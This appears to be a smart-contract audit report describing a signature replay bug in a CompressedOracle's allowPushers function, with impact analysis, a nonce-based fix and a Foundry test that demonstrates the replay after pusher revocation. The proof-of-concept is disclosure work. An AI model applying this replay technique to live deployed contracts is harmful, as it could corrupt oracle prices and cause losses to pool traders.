### Title
Signature Replay in `allowPushers` Silently Undoes Pusher Self-Revocation, Corrupting Creator Feed Prices — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary
`allowPushers()` accepts any valid EIP-191 signature whose deadline has not yet expired. There is no nonce or used-signature tracking. After a pusher calls `revokePusher()`, the creator can replay the original signature (before its deadline) to re-establish the delegation without the pusher's renewed consent. The pusher's subsequent `fallback()` calls then write into the creator's namespace instead of their own, corrupting the creator's feed prices.

### Finding Description
The signature domain for `allowPushers` is:

```
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
```

This commits to a deadline but not to a use-count or revocation state. Once the pusher signs and the creator calls `allowPushers()`, the creator retains a valid, replayable credential until the deadline expires. `revokePusher()` zeroes `namespaceRemapping[msg.sender]` but does not invalidate the outstanding signature. The creator can immediately call `allowPushers()` again with the same calldata to restore `namespaceRemapping[pusher] = creator`.

The code comment at lines 186–191 explicitly states the deadline is the mechanism preventing re-delegation after revocation, but the deadline only gates *expiry*, not *re-use*.

### Impact Explanation
After the silent re-delegation:
- The pusher's `fallback()` calls write into the creator's namespace (slots keyed by `creator << 96 | slotId`).
- Any pool consuming the creator's oracle feed via `price(feedId, pool)` receives data the pusher did not intend for that feed.
- This constitutes **bad-price execution**: the oracle returns a quote derived from data pushed into the wrong namespace, which reaches live pool swaps.
- Pool traders executing swaps against a feed corrupted this way can receive incorrect prices, leading to direct fund loss or pool insolvency.

### Likelihood Explanation
- The creator must have retained the original signature bytes (trivially true — they submitted the transaction and can cache calldata).
- The deadline must not have expired. Deadlines are creator-chosen; a 1-hour or 1-day deadline is standard practice.
- The pusher must have revoked. This is the exact scenario the deadline comment claims to protect against.
- No privileged role is required — the creator is an ordinary user of the permissionless oracle.

### Recommendation
Track consumed signatures with a `mapping(bytes32 => bool) private _usedDelegations` keyed on the full signature hash (or the signed digest). Mark it `true` on first use in `allowPushers()` and revert if already set. Alternatively, introduce a per-pusher nonce that the pusher signs and that increments on each successful delegation, making prior signatures invalid after revocation.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayDelegationTest is Test {
    CompressedOracleV1 oracle;
    uint256 constant PUSHER_KEY = 0xBEEF;
    address pusher;
    address creator = address(0xC0FFEE);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testReplayAllowPushersAfterRevoke() public {
        uint256 deadline = block.timestamp + 1 hours;

        // Pusher signs consent once
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Step 1: creator delegates pusher
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator);

        // Step 2: pusher self-revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // Step 3: creator replays the SAME signature before deadline — succeeds
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs); // no revert
        assertEq(oracle.namespaceRemapping(pusher), creator, "silently re-delegated");

        // Step 4: pusher pushes, believing they write to their own namespace
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint256 word = (uint256(tsMs) << 8) | uint256(0); // slotId=0
        word |= uint256(uint48(0xDEAD_0000_0505)) << 208;
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // Push landed in CREATOR's namespace, not pusher's
        assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0,
            "creator feed corrupted by pusher's unintended push");
        assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0,
            "pusher's own namespace untouched");
    }
}
